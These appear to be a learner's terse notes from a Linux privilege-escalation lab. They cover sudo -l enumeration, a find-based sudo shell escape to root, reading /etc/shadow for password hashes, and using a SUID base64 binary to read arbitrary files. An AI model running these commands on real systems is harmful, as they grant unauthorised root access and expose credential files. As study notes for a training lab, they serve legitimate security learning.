# LINUX PrivEX

Task 6

```
>> sudo -l 

```
found the find  command and went to gtfobins for a sudo priv esc command

```
>> sudo find . -exec /bin/sh \; -quit

```

the root


to read the password hash , i checked the /etc/shadow file 

```
>>  cat /etc/shadow

```

# Task 7


### setuid  (Set-user Identification)  -> These allow files to be executed with the permission level of the file owner or the group owner, respectively.

find files with Setuid bit set using the find command

    1722     44 -rwsr-xr-x   1 root     root               43352 Sep  5  2019 /usr/bin/base64  

```

>> LFILE=file_to_read

>> ./base64 "$LFILE" | base64 --decode

```

file read 



## Pset

	Excalate with less command Sudo
